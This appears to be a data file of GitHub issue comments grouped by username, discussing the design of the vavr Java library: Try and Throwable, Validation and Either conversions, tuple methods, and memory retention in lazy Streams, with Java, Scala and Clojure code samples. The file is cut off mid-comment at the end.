    "florian-stefan": "I think that getIfDefined describes pretty good what the partial function actually does.. I am happy to do that :) Should be possible to solve this issue during this week.. I created a pull request (#2144). But the Travis job for the Java 9 build is failing (https://travis-ci.org/vavr-io/vavr/jobs/291081390#L2163). This seems to be a flickering test. Is there a way to restart the affected build job without using a dummy commit?. Close and reopen pull request to restart Java 9 build.. I think this issue is related: https://github.com/elastic/elasticsearch/issues/10145\n\nTraditionally, javac has performed some unspecified \"simplifications\" that led to T being inferred as 'Number' rather than 'CAP#1'. These unspecified behaviors break programs that should compile, but also allow programs like these to be compiled when the spec disallows them (see JDK-8039214).. Thanks for your review! I will have a look into the issue you mentioned ... buy the way: the Java 9 compilation step within the Travis build seems to be flickering?. \n",
    "mrpotes": "@danieldietrich I'm not sure I agree with your assertion that \"we will always end up with Throwable\" - as per the original comment, you will always end up with Exception - you shouldn't ever end up with Throwable unless there is some poorly written code trying to handle Errors.\nI totally get the reasons for not using generics, and that's fine, but I really think you should consider changing Throwable everywhere to Exception. For me, vavr becomes a waste of time and effort without this.. Perhaps I could challenge you to give an example that shows why Throwable is actually required in vavr, where Exception would not be sufficient?. ",
    "feliksik": "Based on https://github.com/vavr-io/vavr/pull/2360 https://github.com/vavr-io/vavr/pull/2352 I see the agreement reached in this thread so far has not or only partially led to the fix of making it Exception instead of Throwable? \nDoes this mean that a Try underlying failure will remain Throwable, and that it's up to the client application to fix this by pushing the Throwable back into a more constrained type (i.e. Exception)? Or should I deal with things differently? \nI understand the tensions of fixing the API vs not breaking existing code and can't oversee the tradeoffs in this situation, but I was hoping this Throwable thing would be abandoned before 1.0... . > Please give me an example. Where do you need to push the Throwable back into a more constrained type? The 'recover' methods will be able to give you the expected exception type (see above).\nI think this happens when I want to go back to throwing exceptions, which most likely only happens in the context of some non-vavr calling context; e.g. the code below where I must use exceptions to properly implement the interface:\n```\n    // note guava CacheLoader is declared with \"throws Exception\"\n    class MyEntityLoader extends jersey.repackaged.com.google.common.cache.CacheLoader {\n        public MyEntity load(UUID key) {\n        return underlyingRepo.lookupMyEntity(key)\n                .getOrElseThrow(f -> \n                         // have to wrap here, to make it not a Throwable... but \n                        new RuntimeException());\n    }\n}\n\n```\nBut I guess this is an easy solution, and some interface might require RuntimeException, IOException or some other constrained type... And indeed, as we cannot make vavr use a genericized exception type, I guess it's impossible to solve it, or not worth it..... ",
    "rumatoest": "@chagmed No it is not, because properties naming convention against such weirdo thing like _variable or _my_java_var_name (it is not python). @chagmed No it is not, because properties naming convention against such weirdo thing like _variable or _my_java_var_name (it is not python)\n. > it makes sense to leave it like that\nNo it does not.  There are some conventions in Java and Java devs should follow them or switch to other language.. > Changing the member symbols for tuple would be a breaking change.\nI already saw breaking changes in latest commits , thus I do not thing that this is a big deal until version 1.0 , because vavr developer already doing this.\nBTW there are no getters for those public final member, so it is possible to add getters with valid names.. > but what's with seventeenth and twentyfirst \nIMHO if you require such big tuple, than probably you have some issues in your code :) But nevertheless t.e1 or any letter prefix is better than underscore. In this case t.p1 is very-very javish because \"p\" is for property :rofl: \n. > I think the idea of classical Java beans does not fit well here. Beans (aka DTOs) need a no-arg constructor, getters and setters\nHuge amount of frameworks in JAVA rely on getVALUE methods (does not matter is it purely DTOs or not) it is just a right way to get property of object.. ",
    "lvc": "\nJavaslang was renamed to Vavr - it would be great to also add it because Javaslang isn't updated anymore\n\nhttps://abi-laboratory.pro/java/tracker/timeline/vavr/\n\n. ",
    "endlessoblivion": "Thanks for the reply, Daniel.\nFirst, your sample example seems to depend on the fact that those two partial functions (isEven & isOdd) are complementary and form a total function when combined. What would happen if they weren't complementary? (Edit: I see now, it should filter out non-matching elements.)\nSecond, yes, I meant the case where PartialFunction would not extend Function at all, just the Function1 would extend both of them. The way Scala has this reversed may be justifiable from the pattern matching POV, but otherwise it seems illogical and mathematically incorrect -- a total function F1 is a special case of PF (or PF1), not vice-versa.\nThird, your suggested solution sounds reasonable, indeed the pattern matching looks like the sole purpose of PF's existence in Vavr. Also, it would justify the naming assymetry of PF vs. F1, F2, ..., FN. And finally, it would leave the name space free for any custom PF1, ..., PFN, should anyone have a need to define them.\nRegards...\n/Karel/\nP.S.: Scala seems to implement PF.apply(x) as PF.applyOrElse(x, PF.empty). ",
    "lilmaddiekins": "Thanks @nfekete, feels kind of unfortunate that such type hinting is needed but this does indeed solve the problem.. ",
    "grievejia": "\nwhen the element is already contained in the set/map it's doing a replace on the existing element with the new instance in both the set/map and the queue used for keeping insertion order of the elements\n\nI see. Is this mentioned anywhere in the doc? The replacement behavior is quite surprising to me. Why not just refuse to add the new element if it's already contained?\nAlso, if what you said is the root cause, then set1.addAll(set2) or set1.union(set2) should take the same time to run as for (int i: set2) set1 = set1.add(i). But this doesn't seem to be the case. . Thanks for the response. Closing this as the quadratic behavior is expected. . I'd be glad to. Just a few lines of additional JavaDoc on those methods, right?. Thanks for the reply, @danieldietrich and @nfekete!\nIn addition to the Javadoc modification, I think the user guide needs to be updated as well, as it specifies that add/put in LinkedHashSet/LinkedHashMap has effectively constant complexity, which, according to this thread, is not true. I can't seem to find the sources of the user guide pages in this repo, so I guess it must be stored somewhere else where I don't have access to in my pull request.. ",
    "404-": "@danieldietrich thank you for such a fast turnaround and the feedback.\nI could write something up, but I'm not sure if there's enough content. Akka team does a decent job of duplicating APIs that return a scala.concurrent.Future such that the return type of each duplicated API is java.util.concurrent.CompletionStage. The main point of entry for Vavr is the io.vavr.concurrent.Future#toCompletableFuture converter. E.g., akka.pattern.PatternsCS has a set of APIs that parallel those in the akka.pattern package object:\n```\npackage com.example;\nimport akka.actor.AbstractActor;\nimport akka.dispatch.MessageDispatcher;\nimport java.util.concurrent.CompletionStage;\nimport java.util.concurrent.Executor;\nimport static akka.pattern.PatternsCS.pipe;\npublic class AkkaWithVavrFutures extends AbstractActor {\n    Service service;\n    MessageDispatcher dispatcher;\nvoid foo() {\n    pipe(service.call(dispatcher), dispatcher).to(self());\n}\n\ninterface Service {\n    class Response {}\n\n    CompletionStage<Response> call(Executor executor);\n    //desired replacement:\n\n//        io.vavr.concurrent.Future call(Executor executor);\n    }\n}\n``\nIn this scenario, imagine that I'm on a team (at a private company) which vends an internal framework based on Akka. This team controls a set of interfaces (similar to theService` interface above, which the clients use as entry points into the framework. As long as other APIs that clients rely on are also using Vavr classes, it would be pretty straightforward and desirable to use Vavr's Future over Java's CompletionStage.\nIs this the kind of content you had in mind for a blog post?\nRegarding fatal errors, I'm not sure if anything else needs to be done in addition to re-throwing them - after all, there's no way for an application to recover from them. Just let it crash, right? Or am I missing something?. @danieldietrich can you take a look at the code and let me know if you'd like me to add or change anything: https://gist.github.com/404-/6cad39b36f51c9e0136404ef16be5fc4\nI'll do the actual write-up once we're happy with the code.. @danieldietrich Sorry for the delay, here's the whole thing (including the blog post itself): https://gist.github.com/404-/270c335df382132ef30251b5e5b14c0b\nCan you take a look and let me know if you'd like me to add or amend anything?. @danieldietrich good point, I've updated my GitHub profile. Were you looking for any other info or is what I provided sufficient?\nBy the way, when I was writing the code, I wasn't sure if it was useful to include the two helper methods (i.e., the entirety of TemporaryWorkarounds.java) since you were planning on addressing them in Vavr itself. Feel free to completely remove them, as if the code samples were written against an upcoming version of Vavr where something like $InstanceOf is already present and Future.of no longer requires an ExecutorService.. ",
    "Bill": "A colleague figured out that we can first Validation.toEither() and then use getOrElseThrow() (on the Either.Left or Either.Right). The latter methods (unlike getOrElseThrow() on a Validation, inherited from Value) happen to take a Function<? super L, X> and that fn gets passed the optional content (in this case the Left content).\nIn this light, it seems like an oversight, that there is no getOrElseThrow(Function<? super L, X>) on Validation.Valid/Validation.Invalid to match the corresponding methods on Either.Left/Either.Right.\nHere is an updated JUnit 4 test that exercises all four approaches, testing all three conditions on each:\nWhole project: https://github.com/Bill/validation-to-try\nThe test:\n```java\nimport java.util.Arrays;\nimport java.util.Collection;\nimport org.junit.Rule;\nimport org.junit.Test;\nimport org.junit.rules.ErrorCollector;\nimport org.junit.runner.RunWith;\nimport org.junit.runners.Parameterized;\nimport io.vavr.control.Either;\nimport io.vavr.control.Try;\nimport io.vavr.control.Validation;\nimport static org.hamcrest.CoreMatchers.*;\n@RunWith(Parameterized.class)\npublic class ValidationToTryTest {\n@Parameterized.Parameters\npublic static Collection<Object[]> data() {\n    final Validation<String,String> invalid =\n            Validation.invalid(\"a problem\");\n\n    final Validation<? extends Throwable,String> invalidViaMapError =\n            invalid.mapError(IllegalArgumentException::new);\n\n    final Either<String,String> leftEither =\n            invalid.toEither();\n\n    return Arrays.asList(new Object[][] {\n\n            { \"via mapError() then toTry()\",\n              Try.of(()-> invalidViaMapError.toTry().get()) },\n\n            { \"via getOrElseThrow()\",\n              Try.of(()-> invalid.getOrElseThrow(IllegalArgumentException::new)) },\n\n            { \"via mapError() then user-defined toTry()\",\n              Try.of(()-> toTry(invalidViaMapError).get()) },\n\n            { \"via toEither() then toTry()\",\n              /*\n               If we try to use a method reference here, the compiler helpfully informs us that the\n               reference is ambiguous. You see, IllegalArgumentException has a default constructor\n               and one that takes a String. getOrElseThrow() is defined up in Value and down in\n               Either. The one up in Value takes a Supplier whereas the one down in Either takes\n               a Function. The latter is passed the left value if the Either isLeft()\n               */\n              Try.of(()-> leftEither.getOrElseThrow(error->new IllegalArgumentException(error)))}\n\n    });\n}\n\n@Parameterized.Parameter\npublic String description;\n\n@Parameterized.Parameter(1)\npublic Try<String> tryGet;\n\n@Rule\npublic ErrorCollector collector = new ErrorCollector();\n\n@Test\npublic void test() {\n    collector.checkThat(description, tryGet.isFailure(), is(true));\n    collector.checkThat(description, tryGet.getCause(),is(instanceOf(IllegalArgumentException.class)));\n    collector.checkThat(description, tryGet.getCause().getMessage(),is(\"a problem\"));\n}\n\nprivate static <T> Try<T> toTry(final Validation<? extends Throwable,T> v) {\n    // avoid calling v.toTry() if v.isInvalid()\n    return v.isValid() ? v.toTry() : Try.failure(v.getError());\n}\n\n}\n```\nThe first scenario (via mapError() then toTry()) fails two conditions:\n```\njava.lang.AssertionError: via mapError() then toTry()\nExpected: is an instance of java.lang.IllegalArgumentException\n     but:  is a java.util.NoSuchElementException\njava.lang.AssertionError: via mapError() then toTry()\nExpected: is \"a problem\"\n     but: was \"get of 'invalid' Validation\"\nExpected :a problem\nActual   :get of 'invalid' Validation\n```\nThe second scenario (via getOrElseThrow()) fails one condition:\njava.lang.AssertionError: via getOrElseThrow()\nExpected: is \"a problem\"\n     but: was null\nThe last two scenarios pass all tests.. Back in January (above) I came to the conclusion that, it seemed like an oversight, that there was no getOrElseThrow(Function<? super L, X>) on Validation.Valid/Validation.Invalid to match the corresponding methods on Either.Left/Either.Right that take Functions.\nYesterday I ran into an analogous problem trying to convert a Try to a Validation:\njava\nValidation<String,Apple> doSomeValidation(final String name) {\n    return Try.withResources(() -> new AppleReader(name)).of(reader->{\n      // do things with the reader. some things cause exceptions\n      return reader.read();\n    }).toValidation( /* I'd like to convert the Throwable into a Validation error here! */ );\n}\nBut the Try does not send its error (Throwable) to the function supplied by the caller, so I had to do this:\njava\nValidation<String,Apple> doSomeValidation(final String name) {\n    final Try<Apple> apple = Try.withResources(() -> new AppleReader(name)).of(reader->{\n      // do things with the reader. some things cause exceptions\n      return reader.read();\n    });\n    return apple.toValidation(()->apple.getCause().toString());\n}\nNotice the yucky introduction of an extra statement to capture the intermediate variable.\nTry has:\njava\n    default <L> Validation<L, T> toValidation(L invalid)\n    default <L> Validation<L, T> toValidation(Supplier<? extends L> invalidSupplier)\nBoth inherited from Value. But there is no conversion to Validation that has access to the error if the Validation isInvalid(). That is, there is no variant of this function that takes a Function/Function1.\nSo we have a bunch of types that model \"alternatives\". All but one (Option) carry important information in the \"left\"/\"cause\"/\"error\" part:\njava\nEither\nTry\nValidation\nFor each of those, there are various higher-order functions that should, in general, pass the \"left\"/\"cause\"/\"error\" to the caller-supplied function, but do not.\nSearching through Value, Either, Try, and Validation for \"supplier\" I gathered the full list of functions of interest. On each of Either, Try, and Validation I think these functions should be overloaded to take a Function/Function1:\n```java\n// unless otherwise noted, \"left\"/\"cause\"/\"error\" value will be passed to fn\nTry.       toEither(fn)\nValidation.toEither(fn)\nEither.    toTry(fn)\nValidation.toTry(fn)\nEither.    toValidation(fn)\nTry.       toValidation(fn)\n// each of the following should be defined on each of Try, Validation, and Either:\ngetOrElse(fn)\ngetOrElseThrow(fn)\ngetOrElseTry(fn)\norElse(fn)\ntoInvalid(fn)    // pass \"right\"/\"value\" value to fn\ntoValid(fn)      // pass \"left\"/\"cause\"/\"error\" value to fn\ntoLeft(fn)       // pass \"right\"/\"value\" value to fn\ntoRight(fn)      // pass \"left\"/\"cause\"/\"error\" value to fn\n```\nWith that done, my validation method could look something like this:\njava\nValidation<String,Apple> doSomeValidation(final String name) {\n    return Try.withResources(() -> new AppleReader(name)).of(reader->{\n      // do things with the reader. some things cause exceptions\n      return reader.read();\n    }).toValidation( throwable->throwable.toString() );\n}. Generally, since Java methods can be overloaded on argument type but not on return type, fromXXX() methods don't seem to make much sense in a Java library.\nIs that what you are getting at @CauchyPeano?. @CauchyPeano I don't think I can say it any more clearly than I did on March 8.. Thank you @nfekete! That was exactly my problem. Redefining my \"stream\" functions in terms of vavr Iterator let me process arbitrarily long sequences without memory growth. This runs fine with java -Xmx10m whereas using vavr Streams it blows up with 10x the memory:\n```java\n    private static final int SIZE = (int)1E8;\n@Test\npublic void simplestIteratorTest() {\n    assertThat(SIZE+1, is(process(naturalsIterator(), SIZE)));\n}\n\nprivate static Iterator<Integer> naturalsIterator() {\n    return Iterator.iterate(1, i-> i + 1);\n}\n\nprivate static int process(final Traversable<Integer> traversable, final int size) {\n    return traversable.drop(size).head();\n}\n\n```\nQ.E.D.\nThat being said, I don't know what I'd want a vavr Stream for \ud83e\udd14 . Inasmuch as vavr is a functional programming library, I expected vavr's Stream to be like a SICP stream or a Clojure sequence.\nI am very surprised that a thing called Iterator, in any Java library,  is filling the role of SICP-style stream especially given the dichotomy between iterators (stateful) and SICP-style streams (immutable).\nAre vavr's name choices, Stream/Iterator, coming from Scala tradition? A little googling leads me to believe that this is indeed the case \u2713 (diabolical). I have learned so much. But I still don't understand why this holds onto all the Stream data for so long:\njava\n   final int SIZE = (int)1E8;\n   assertThat(SIZE+1, is(Stream.iterate(1, i -> i + 1).drop(SIZE).head()));\nLooking at the pertinent Stream methods:\n```java\n    static  Stream iterate(T seed, Function<? super T, ? extends T> f) {\n        Objects.requireNonNull(f, \"f is null\");\n        return Stream.ofAll(Iterator.iterate(seed, f));\n    }\nstatic <T> Stream<T> ofAll(Iterable<? extends T> elements) {\n    Objects.requireNonNull(elements, \"elements is null\");\n    if (elements instanceof Stream) {\n        return (Stream<T>) elements;\n    } else {\n        return StreamFactory.create(elements.iterator());\n    }\n}\n\n```\nAnd looking at Stream.drop():\njava\n    @Override\n    default Stream<T> drop(int n) {\n        Stream<T> stream = this;\n        while (n-- > 0 && !stream.isEmpty()) {\n            stream = stream.tail();\n        }\n        return stream;\n    }\nIt seems like the Stream will be lazily materialized by the tail() calls in the drop() loop \u2713 But what I don't see is why the old head doesn't become garbage after each iteration completes.. And once again, I am surprised. Iterator does not appear to be immutable like a SICP-style stream. Instead it is mutable, more like a Java iterator:\njava\n    @Test\n    public void iteratorImmutabilityTest() {\n        final Iterator<Integer> sixPlus = naturalsIterator().drop(5);\n        assertThat(sixPlus.drop(5).head(), is(11));\n        assertThat(sixPlus.drop(5).head(), is(11)); // assertion fails!\n    }\njava.lang.AssertionError: \nExpected: is <11>\n     but: was <17>\nSomehow each of those drop(5) calls mutated the object reference by sixPlus. Digging in I see that vavr Iterator.next() actually (indirectly) calls java.util.Iterator.next()\u2014mutating an actual Java iterator.\nIs there no vavr thing that behaves like an immutable SICP-style stream/Clojure sequence?. Thanks @danieldietrich. As I've dug deeper into this issue I have come to believe that there is no good solution to the problem of scalable, lazy, immutable, sequence processing, for a Java library\u2026\nVavr's Lazy is actually very close to the SICP-style stream/Clojure sequence I seek. But there are deeper problems beyond the fact that e.g. as @nfekete pointed out: drop() is an instance method on Stream.\nYou can rewrite drop() as a static method so it doesn't hold onto its head (this, in this case). That'll get you a little further, but then you'll run into the next set of problems\u2014problems that can't be fixed without severe contortion of all your library code, and a lot of client code too\u2026\nIn the Clojure community, those contortions fall under the heading \"closed-over locals clearing\".  Failing to aggressively clear closed-over locals will prevent the garbage collector from seeing what is properly garbage, in run-of-the-mill stream processing scenarios.\nIt turns out that a pillar of functional programming, recursion, is pretty easy to do without most of the time, in Java\u2014by replacing recursion with looping. It's a little annoying, but you can start with recursive code, and the transformation to looping code is fairly straightforward. And when you're done, the result is still pretty readable. You can bundle that ugly code up into some higher-order fns that will take you very far.\nWhat's surprising, to me at least, is that it is the garbage collection implications of laziness that present the more significant challenge. The Clojure compiler, for instance, goes to great lengths to clear closed-over locals. I've tried doing this by hand for a tiny Java test program and I haven't been able to get it right (yet). Even after I eventually figure it out, the difficulty of getting it right (for the toy case) does not bode well for it's application more generally (in a Java library).\nSo meh. I suppose I'm late to the party. But I was really hoping we could have scalable, lazy, immutable, sequence processing in our Java library.  It seems that you can have any two but not all three:\n\nscalable, lazy (not immutable): use Iterator and loops \u2713\nscalable, immutable (not lazy): loop over ConsImpl \u2713\nlazy, immutable (not scalable): use Lazy. Looping (instead of recurring) lets you be scalable with respect to stack growth, but there's nothing you can do about heap growth \u2713\n\nnote: by \"scalable\" here I mean that neither stack nor heap growth is related to the length of the stream you're processing. Also, when I say \"loop\" I mean write your own loops or call higher-order fns implemented in terms of loops.\nhistoric note: I think Rich Hickey and friends implemented aggressive closed-over local clearing before Clojure 1.0 which was released in 2009. As recently as 2013-2016 bugs were still being discovered and refinements were still being made to that functionality.. @nfekete This is idiomatic Clojure processing of lazy, long (in this case, infinite) sequences:\n```\nBills-MacBook-Air:java-garbage-test Bill$ clojure -J-Xmx10m\nClojure 1.9.0\nuser=> (defn naturals [] (iterate inc 1))\n'user/naturals\nuser=> (for [n [1e3 1e4 1e5 1e6 1e7 1e8]]\n  (time (first (drop n (naturals)))))\n(\"Elapsed time: 40.11968 msecs\"\n\"Elapsed time: 92.93135 msecs\"\n\"Elapsed time: 137.836554 msecs\"\n\"Elapsed time: 824.371466 msecs\"\n\"Elapsed time: 5806.061034 msecs\"\n\"Elapsed time: 36581.824392 msecs\"\n1001 10001 100001 1000001 10000001 100000001)\n```\nWe defined a function that returns the lazy, infinite, sequence of natural numbers. Then we timed dropping the first N of them and getting the N+1th one, for various values of N from N=one thousand to N=one hundred million. In a Java VM with 10MB of heap, it reaches the one-hundred-million-and-first natural number in around 37 seconds.\nThe important part is not necessarily that the sequence is infinite. It's that it is lazy and it is large, relative to the size of stack and the heap. It's important that we're able to process the sequence without overflowing either the stack or the heap.\nHere is the smallest possible Maven/Java/JUnit project I was able to craft to try and attempt the same idea in Java:\nhttps://github.com/Bill/java-garbage-test\nPlease see the README over there for what it is, how it behaves, how I tried to understand its behavior, and why I'm still puzzled.\nupdate September 4, 2018: A kind person on Stack Overflow answered my question, why does this Java method leak\u2014and why does inlining it fix the leak? and pointed out that adding the -Xcomp option to the JVM allows both the drop() and nth() methods to scale in my toy example.\nThen another kind person weighed in, showing me the solution right out of the Clojure library code (clojure.lang.Util.ret1()) that obviates the -Xcomp JVM option.\nMy takeaway is that, while it's possible for a Java library to provide scalable, lazy, immutable sequence facility, it would place an onerous burden on users of that library. See e.g. ClearingArgsJavaTest.nth():\njava\n    static int nth(final int n, /*final*/ LazyishSeq lazySeqArg) {\n        LazyishSeq lazySeqLocal = lazySeqArg;\n        lazySeqArg = null;\n        return drop(n,ret1(lazySeqLocal, lazySeqLocal=null)).head();\n    }\nI wouldn't want to have to write all my sequence-handling methods that way.. If I understand that code, drop(N) mutates the Iterator resulting from naturalsWithIterable().iterator().\nIt is perfectly possible to write lots of good software with mutable objects, and in particular (mutable) iterators. The existence proofs are numerous. But what I'm after, though, is a sequence abstraction that is immutable, like Clojure's sequence and like Abelson & Sussman's Scheme streams, and, incidentally, like Haskell lists.\nNotice how the tail() method on the LazySeq class I defined, is idempotent. Contrast this with the drop(N) method on Iterable.\nIn this toy example, perhaps the value of immutability is not apparent. In Clojure and Scheme and Haskell (immutable) sequences or streams or lists take the place of (mutable) iterators or enumerators (like you have in Java or C++ STL or Ruby). In my opinion, code is easier to write and easier to understand with the immutable abstractions than with the mutable ones.. Here's a Scala worksheet implementing something very similar to what I tried in plain old Java and Java with vavr. Notice I reimplemented some of the Stream methods as functions so as not to hang on to the head of the stream (this in that case): \n```scala\nimport scala.collection.immutable.Stream.cons\ndef iterateA: Stream[A] =\n  cons(start, iterate(f(start), f))\ndef inc(n:Int) = n + 1\ndef naturals() =\niterate(1, inc)\ndef dropT : Stream[T] =\n  if (n <= 0 || s.isEmpty) s\n  else drop(n-1, s.tail)\ndef nthT =\n  drop(n,s).head\ndef N = 1e1.toInt\ndrop(N,naturals()).head\nnth(N, naturals())\n```\nBy implementing iterate(), drop(), and nth() as functions, I see no reason why they would cause objects to be retained in memory as they iterated.\nI set N large e.g. 1e7, and observed significant memory growth in the JVM. That, coupled with googling about Scala and finding no mention of clearing of closed-over locals, leads me to believe that Scala does not clear closed-over locals and therefore suffers the same memory growth I see with my Java code.\nI poked around a little bit but it wasn't obvious how to get at the class file the Scala compiler generated. That would be interesting.\nThis is pretty surprising. My impression was that Scala came from the Haskell tradition. Scala has actual syntax for call-by-name (which is used in the library definition of cons()) \u2713 Given how important laziness is for our ability to apply \"equational reasoning\" it just doesn't make sense that the garbage issue hasn't been addressed.\nI must be missing something.\nUpdate September 6, 2018: Stack Overflow abides https://stackoverflow.com/questions/52208959/function-forwarding-stream-parameter-to-another-function-retains-reference\nChanging nth(n,s) to this, solves the scaling problem:\nscala\n  // have to call by name (s) here, otherwise we hold on to head!\n  def nth[T](n : Int, s : => Stream[T]) =\n    drop(n,s).head. Yeah that is interesting (that the heap interaction of dropTest() changes significantly when debugging.)\nNote that the Clojure compiler has an option to disable locals-clearing. It's there to overcome the problem that \"when using a debugger locals will appear as nulls, which makes debugging difficult\". The Cursive Clojure plugin for IntelliJ has a button to enable/disable this feature. (The section Starting a Debug REPL has a good explanation).\nI've spent some time looking at the JVM instructions in class files generated by the Clojure compiler. Have a look at this Clojure fn:\nclojure\n(defn foo [x]\n  (iterate inc x))\nHere's the Java decompiled from the class file generated by the Clojure compiler:\n```java\npublic final class core$foo extends AFunction {\n    public static final Var const__0 = (Var)RT.var(\"clojure.core\", \"iterate\");\n    public static final Var const__1 = (Var)RT.var(\"clojure.core\", \"inc\");\npublic core$foo() {\n}\n\npublic static Object invokeStatic(Object x) {\n    IFn var10000 = (IFn)const__0.getRawRoot();\n    Object var10001 = const__1.getRawRoot();\n    Object var10002 = x;\n    x = null;\n    return var10000.invoke(var10001, var10002);\n}\n\npublic Object invoke(Object var1) {\n    Object var10000 = var1;\n    var1 = null;\n    return invokeStatic(var10000);\n}\n\n}\n```\nNotice the function foo is implemented via class core$foo that extends AFunction (abstract base-class) which defines invoke(\u2026) methods for various arities. See how the method call is bounced to a static method call? See how before calling anything, method parameters are first nulled?\nLook at the bytecodes generated for the core$foo.invoke() method:\npublic invoke(Ljava/lang/Object;)Ljava/lang/Object;\n    ALOAD 1\n    ACONST_NULL\n    ASTORE 1\n   L0\n    LINENUMBER 79 L0\n    INVOKESTATIC jira_rate/core$foo.invokeStatic (Ljava/lang/Object;)Ljava/lang/Object;\n    ARETURN\n    MAXSTACK = 2\n    MAXLOCALS = 2\nThis is a method call so this is the local variable indexed at 0 and the first explicit parameter, var1 is at index 1. We ALOAD var1 onto the stack, then we ALOAD null onto the stack and store it into the local at index 1 (var1). Then we invoke the static method. At that point the local var1 on the stack has been set to null and its original value is on the stack (lower down) for core$foo.invokeStatic to use. Note though that this is on the stack in core$foo.invoke()'s frame and is not null. It's an instance of core$foo and so I don't think it will have any impact on GC tracing.\nFor completeness, here's the bytecode for core$foo.invokeStatic():\npublic static invokeStatic(Ljava/lang/Object;)Ljava/lang/Object;\n   L0\n    LINENUMBER 79 L0\n    GETSTATIC jira_rate/core$foo.const__0 : Lclojure/lang/Var;\n    INVOKEVIRTUAL clojure/lang/Var.getRawRoot ()Ljava/lang/Object;\n   L1\n    LINENUMBER 80 L1\n    CHECKCAST clojure/lang/IFn\n    GETSTATIC jira_rate/core$foo.const__1 : Lclojure/lang/Var;\n    INVOKEVIRTUAL clojure/lang/Var.getRawRoot ()Ljava/lang/Object;\n    ALOAD 0\n    ACONST_NULL\n    ASTORE 0\n   L2\n    LINENUMBER 80 L2\n    INVOKEINTERFACE clojure/lang/IFn.invoke (Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;\n   L3\n    ARETURN\n    LOCALVARIABLE x Ljava/lang/Object; L0 L3 0\n    MAXSTACK = 4\n    MAXLOCALS = 1\nI am curious to know if the Scala compiler performs this sort of clearing of locals. As I said, I suspect it does not. Without this local clearing\u2014either by a compiler, or by hand-written Java code, I don't see how we can't have scalable, lazy, immutable sequences.\nIt seems that the Scala community, and by extension, the vavr community, has primarily carried forth the Java/C++/Ruby tradition of using iterators/iterators/enumerators (mutable) for sequence processing, as opposed to the Scheme/Haskell/Clojure tradition of immutable streams/lists/sequences for sequence processing. As I've said, that can certainly work.\nSeems a shame though, since so much modern work in functional programming assumes immutability. Haskell has been the lingua franca of functional programming for over twenty years. Look at this paper for instance:\nhttp://www.cs.nott.ac.uk/~pszgmh/fold.pdf\nHow could those results be applied to Scala with iterators? At a minimum, the proofs would have to be adapted to mutability, perhaps by placing certain constraints on the iterators. On the other hand, even though it has a different syntax, and lacks Haskell's type system, Clojure benefits from Hutton's proof framework, I believe, since Clojure's reduce is directly analogous to the fold/foldr on which the framework is built.\nUpdate: I heard from Graham Hutton, the author of that paper. He said:\n\nI think you could write the programs from the paper in any language that supports higher-order functions, but the reasoning aspect of the paper likely requires a pure functional language, as the basic principles of equational reasoning are not valid in other settings.\n\nThen I heard from Jeremy Gibbons (a.k.a. @jegi here on Github) who shared this:\n\nBruno Oliveira's and my paper \"The Essence of the Iterator Pattern\" was intended to capture the story for mutable datatypes. http://www.cs.ox.ac.uk/publications/publication1409-abstract.html \u2026\n\nThose two papers, to me, encapsulate the whole problem/opportunity here. If you have the opportunity to build on immutable sequences, you eliminate a ton of complexity relative to (mutable) iterators.\nUpdate September 6, 2018: if you look at my updates to this thread you'll see that, thanks to kind+smart people on Stack Overflow, not only do I have a Java solution (borrowed from clojure.lang.Util.ret1() but I also have a general Scala solution too (call by name).\nSo Scala/vavr Stream can work. If you're gonna pass around streams in Scala, you need to do so, by name, not by value. In Java/vavr land, the clojure.lang.Util.ret1() trick for clearing the local is a bit uglier\u2014but it works.. ",
    "jlorenzen": "@nfekete Yeah I think so. Basically the following:\njava\nfinal Tuple2<String, String> user = Tuple.of(\"John\", \"Doe\");\nfinal Tuple3<String, String, String> userWithEmail = user.concat(\"john.doe@example.com\");. @nfekete @danieldietrich I would be interested in making these changes if you guys would welcome them and offer any suggestions?. @ruslansennov That last discussion didn't really go deep into why it was removed. There is hint of people not liking that Tuple8 (the last numbered Tuple) had to throw an exception since there isn't a Tuple9 class.\nLooking at the last jOOL Tuple class, Tuple16, they just don't add a concat method. That would seem like a reasonable compromise.\nHere is the reason I'd like to see the vavr Tuple classes have at least a concat or append method. Lately I've been using the Validation class to perform validation on HTTP request parameters. I then convert those to a Tuple to be used in the next step. So something like the following:\n```java\nprivate SignInResult signIn(final String email, final String password) {\n    validate(email, password)\n        .flatMap(emailAndPassword -> emailAndPassword.apply(signInService::signIn));\n}\nprivate Either validate(final String email, final String password) {\n    // create validation objects for each param\n    return Validation.combine(emailValidation, passwordValidation)\n        .ap(Tuple::of)\n        .toEither();\n}\n```\nGiven my example above, my problem is the signInService.signIn method takes a third parameter that doesn't come from client input. Perhaps it might include the IP Address of the client. So here is what I would like to do:\njava\nprivate SignInResult signIn(final String email, final String password) {\n    validate(email, password)\n        .map(emailAndPassword -> emailAndPassword.append(getClientAddress()))\n        .flatMap(signInValues -> signInValues.apply(signInService::signIn));\n}\nInstead I have to reference the tuple values (which I can't stand to do because I feel it hurts readability):\njava\nprivate SignInResult signIn(final String email, final String password) {\n    validate(email, password)\n        .flatMap(emailAndPassword -> signInService.signIn(emailAndPassword._1, emailAndPassword._2, getClientAddress()));\n}\nI really enjoy using the Tuple.apply methods because it helps me avoid referencing the individual values using ._n.. @danieldietrich Hey I took an initial stab at making these changes and I would appreciate some feedback before I go any further. See the PR here: https://github.com/vavr-io/vavr/pull/2221. Thanks!. @valery1707 Ah ok. Sorry. I didn't realize those were checked in. I'll do that now.. Pushed up the generated files now. Any other feedback? I'll probably work on this some more tonight.. @danieldietrich @ruslansennov @valery1707 Ok I've made all the recommended changes. It's ready for a final review.. @danieldietrich Ok I updated the script to set the javadocs for the type parameters. I think it's ready for a final review and merge.\nHowever, it failed in CI but the failure it unrelated to my changes. The test that failed was: FutureTest.shouldNotCrashWhenRecoverFails:852 Condition not met.. I'm guessing this might just be an anomaly. I would kick off the job again but I'm not sure how to do that.. @danieldietrich Yeah I'm not sure of the overall direction for vavr 1.x. I know you've been planning some pretty major changes. I know I wouldn't necessarily be a fan if I had to do this:\njava\ntoEither(Try.of(() -> invoke()), t -> mapError(t))\nIt quickly becomes less readable I think as you add more stuff to the Try (ie map, flatMap, filter, etc).\nIf you want, I'd love to submit a PR to add Try#toEither(Function<? super L, ? extends U> leftMapper). Just let me know.. @danieldietrich Thanks Daniel. I'm not sure our projects are going to be able to upgrade to 1.x given how much is changing. Are you stilling planning on the major changes in 1.x and if so are there any chances some of these changes can make it back into the 0.x release?. Yeah I guess you are right. I'll remove those. . Oh you're right. Good call. I'll put just those back.. @valery1707 @danieldietrich I 